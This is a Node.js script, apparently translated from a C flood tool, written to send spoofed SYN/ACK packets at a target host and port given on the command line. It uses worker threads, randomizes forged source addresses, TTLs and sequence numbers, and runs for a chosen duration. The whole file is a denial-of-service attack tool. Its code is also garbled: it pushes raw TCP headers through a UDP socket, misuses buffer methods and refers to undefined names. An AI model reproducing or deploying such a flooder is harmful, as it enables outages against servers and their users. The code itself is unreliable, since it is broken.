const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const dgram = require('dgram');

const host = process.argv[2];
const port = parseInt(process.argv[3]);
const numThreads = parseInt(process.argv[4]);
const ppsLimiter = parseInt(process.argv[5]);
const duration = parseInt(process.argv[6]);

const MAX_PACKET_SIZE = 4096;
const PHI = 0x9e3779b9;

let Q = new Array(4096).fill(0);
let c = 362436;
let floodport = port;
let limiter = 0;
let pps = 0;
let sleeptime = 100;

function init_rand(x) {
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (let i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

function rand_cmwc() {
    let t, a = 18782;
    let i = 4095;
    let x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

function randnum(min_num, max_num) {
    let result = 0, low_num = 0, hi_num = 0;
    if (min_num < max_num) {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }
    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

function csum(buf, count) {
    let sum = 0;
    while (count > 1) {
        sum += buf.readUInt16BE(count * 2 - 2);
        count -= 2;
    }
    if (count > 0) {
        sum += buf[count * 2 - 1];
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (~sum);
}

function tcpcsum(iph, tcph, pipisize) {
    let pseudohead = Buffer.alloc(12);
    pseudohead.writeUInt32BE(iph.saddr, 0);
    pseudohead.writeUInt32BE(iph.daddr, 4);
    pseudohead.writeUInt8(0, 8);
    pseudohead.writeUInt8(IPPROTO_TCP, 9);
    pseudohead.writeUInt16BE(12 + 20 + pipisize, 10);

    let totaltcp_len = 12 + 20 + pipisize;
    let tcp = Buffer.alloc(totaltcp_len);
    pseudohead.copy(tcp, 0, 12);
    tcph.copy(tcp, 12, 20);
    let output = csum(tcp, totaltcp_len);
    return output;
}

function setup_ip_header(iph) {
    iph.ihl = 5;
    iph.version = 4;
    iph.tos = 0;
    iph.tot_len = 20 + 20 + 12;
    iph.id = 54321;
    iph.frag_off = 0;
    iph.ttl = 255;
    iph.protocol = IPPROTO_TCP;
    iph.check = 0;
    iph.saddr = '192.168.3.100';
}

function setup_tcp_header(tcph) {
    tcph.source = 8080;
    tcph.check = 0;
    tcph.syn = 1;
    tcph.ack = 1;
    tcph.window = 29200;
    tcph.doff = ((20 + 12) / 4);
}

function setup_tcpopts_header(opts) {
    opts.nop_nouse = 0x01;
    opts.nop_nouse2 = 0x01;
    opts.nop_nouse3 = 0x01;
    opts.msskind = 0x02;
    opts.mssvalue = 1400;
    opts.msslen = 0x04;
    opts.wskind = 0x03;
    opts.wslen = 0x03;
    opts.wsshiftcount = 0x07;
    opts.sackkind = 0x05;
    opts.sacklen = 0x02;
}

function flood(par1) {
    init_rand(Date.now());
    let td = par1;
    let datagram = Buffer.alloc(MAX_PACKET_SIZE);
    let iph = datagram.write(Buffer.alloc(20));
    let tcph = datagram.write(Buffer.alloc(20), 20);
    let opts = datagram.write(Buffer.alloc(12), 40);

    let sin = {
        family: 'IPv4',
        port: floodport,
        address: td
    };

    let s = dgram.createSocket('udp4');

    setup_ip_header(datagram.read(Buffer.alloc(20), 0));
    setup_tcp_header(datagram.read(Buffer.alloc(20), 20));
    setup_tcpopts_header(datagram.read(Buffer.alloc(12), 40));

    let sin_addr = sin.address;
    let sin_port = sin.port;

    datagram.read(Buffer.alloc(20), 0).daddr = sin_addr;
    datagram.read(Buffer.alloc(20), 20).dest = sin_port;

    let tmp = 1;
    s.setBroadcast(true);
    s.bind();
    s.send(datagram, 0, datagram.length, sin.port, sin.address, (err) => {
        if (err) {
            console.error('Error sending packet:', err);
        } else {
            console.log(`Packet sent to ${sin.address}:${sin.port}`);
        }
    });

    let i = 0;
    let interval = setInterval(() => {
        setup_tcpopts_header(datagram.read(Buffer.alloc(12), 40));
        datagram.read(Buffer.alloc(20), 20).seq = rand_cmwc() & 0xFFFFFFFF;
        datagram.read(Buffer.alloc(20), 20).doff = ((20 + 12) / 4);
        datagram.read(Buffer.alloc(20), 20).dest = sin.port;
        datagram.read(Buffer.alloc(20), 0).ttl = randnum(57, 124);
        datagram.read(Buffer.alloc(20), 0).saddr = ((rand_cmwc() >> 24) & 0xFF) << 24 | ((rand_cmwc() >> 16) & 0xFF) << 16 | ((rand_cmwc() >> 8) & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        datagram.read(Buffer.alloc(20), 0).id = (rand_cmwc() & 0xFFFF);
        datagram.read(Buffer.alloc(20), 0).check = csum(datagram, 20 + 20 + 12);
        datagram.read(Buffer.alloc(20), 20).source = (rand_cmwc() & 0xFFFF);
        datagram.read(Buffer.alloc(20), 20).check = tcpcsum(datagram.read(Buffer.alloc(20), 0), datagram.read(Buffer.alloc(20), 20), 12);
        s.send(datagram, 0, datagram.length, sin.port, sin.address, (err) => {
            if (err) {
                console.error('Error sending packet:', err);
            } else {
                console.log(`Packet sent to ${sin.address}:${sin.port}`);
            }
        });
        datagram.read(Buffer.alloc(20), 20).window = windows[randnum(0, 2)];
        pps++;

        if (i >= limiter) {
            i = 0;
            setTimeout(() => {}, sleeptime);
        }
        i++;
    }, 10);

    setTimeout(() => {
        clearInterval(interval);
        s.close();
    }, duration * 1000);
}

if (isMainThread) {
    let threadPool = new Pool({
        create: () => {
            return new Worker(__filename, {
                workerData: { host, port, numThreads, ppsLimiter, duration }
            });
        },
        destroy: (worker) => {
            worker.terminate();
        }
    });

    for (let i = 0; i < numThreads; i++) {
        threadPool.acquire().then((worker) => {
            worker.on('message', (result) => {
                console.log('Packet sent by worker:', result);
            });
            worker.on('error', (error) => {
                console.error('Worker error:', error);
            });
            worker.on('exit', (code) => {
                if (code !== 0) {
                    console.error(`Worker stopped with exit code ${code}`);
                }
                threadPool.release(worker);
            });
        });
    }
} else {
    flood(workerData.host);
}